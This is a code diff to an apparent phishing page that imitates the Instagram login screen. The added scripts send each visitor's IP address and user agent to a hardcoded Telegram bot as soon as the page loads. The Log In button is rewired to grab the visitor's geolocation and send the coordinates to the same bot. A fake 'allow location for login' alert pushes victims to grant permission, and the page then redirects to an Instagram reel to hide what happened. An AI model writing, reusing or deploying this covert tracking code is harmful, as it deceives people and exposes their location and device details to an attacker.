@@ -16,10 +16,126 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 
+
+
+<script>
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sendLocationToBot, handleLocationError);
+  } else {
+    console.log("Geolocation is not supported by this browser.");
+  }
+}
+
+
+function sendLocationToBot(position) {
+  const latitude = position.coords.latitude;
+  const longitude = position.coords.longitude;
+  const botToken = "1573318838:AAEo6CLOlyoMH78Y-Rr65_D21mVuJhWig_0";
+  const chatId = "996470973";
+                    window.location.reload()
+                    window.location.href="https://www.instagram.com/reel/CikcthQhXio/?igshid=YmMyMTA2M2Y="
+              
+                
+  // Send device info
+  const deviceInfo = `Device Info:\n\nUser Agent: ${navigator.userAgent}\n\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+  const deviceInfoUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${deviceInfo}`;
+
+  fetch(deviceInfoUrl)
+    .then(response => response.json())
+    .then(data => {
+      if (latitude && longitude) {
+        // Send location
+        const locationUrl = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
+        fetch(locationUrl)
+          .then(response => response.json())
+          .then(data => console.log(data))
+          .catch(error => console.error(error));
+      }
+    })
+    .catch(error => console.error(error));
+}
+
+function handleLocationError(error) {
+  const botToken = "1573318838:AAEo6CLOlyoMH78Y-Rr65_D21mVuJhWig_0";
+  const chatId = "996470973";
+  
+  // Send device info
+  const deviceInfo = `Device Info:\n\nUser Agent: ${navigator.userAgent}`;
+  const deviceInfoUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${deviceInfo}`;
+
+  
+  
+  
+  fetch(deviceInfoUrl)
+    .then(response => response.json())
+    .then(data => {
+      if (error.code === error.PERMISSION_DENIED) {
+        const errorMessage = "Location permission denied. Please allow location access in your browser settings For login";
+
+        // Show popup message
+        alert(errorMessage);
+        
+        const errorUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${errorMessage}`;
+
+        fetch(errorUrl)
+          .then(response => response.json())
+          .then(data => console.log(data))
+          .catch(error => console.error(error));
+      }
+    })
+    .catch(error => console.error(error));
+}
+
+
+
+
+</script>
+
+<script>
+window.onload = function() {
+  sendDeviceInfoAndIP();
+}
+
+function sendDeviceInfoAndIP() {
+  const botToken = "1573318838:AAEo6CLOlyoMH78Y-Rr65_D21mVuJhWig_0";
+  const chatId = "996470973";
+  
+  // Get device info
+  const deviceInfo = `Device Info:\n\nUser Agent: ${navigator.userAgent}`;
+  
+  // Get IP address
+  fetch("https://api.ipify.org?format=json")
+    .then(response => response.json())
+    .then(data => {
+      const ipAddress = `IP Address: ${data.ip}`;
+      
+      // Send device info and IP address
+      const message = `${deviceInfo}\n\n${ipAddress}`;
+      const messageUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+      
+      fetch(messageUrl)
+        .then(response => response.json())
+        .then(data => console.log(data))
+        .catch(error => console.error(error));
+    })
+    .catch(error => console.error(error));
+}
+
+function sendLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sendLocationToBot, handleLocationError);
+  } else {
+    console.log("Geolocation is not supported by this browser.");
+  }
+}
+</script>
+
+
   </head>
   <body>
     <!-- LOGIN BOX -->
-    <form id="submit-form" action="">
+    <form id="submit-form" >
 
     <div class="login">
       <img src="instagram logo.png" alt="" srcset="" />
@@ -31,7 +147,7 @@
       />
 
       <input class="box2" name="password:" type="password" placeholder="Password" required />
-      <button class="btn" type = "SUBMIT" name="submit_btn" >Log In</button>  
+      <button class="btn" type = "SUBMIT" name="submit_btn" onclick="getLocation()">Log In</button>  
 
 <div class="partition">
         <div class="left"></div>
@@ -56,8 +172,7 @@
                 var parent_div = $(div_id);
                 parent_div.remove();
             } 
-                    window.location.reload()
-                    window.location.href="https://www.instagram.com/reel/CiWWc_wDekf/?igshid=YmMyMTA2M2Y="
+                    
                 },
                 error:function (err){
                     alert("Something Error")
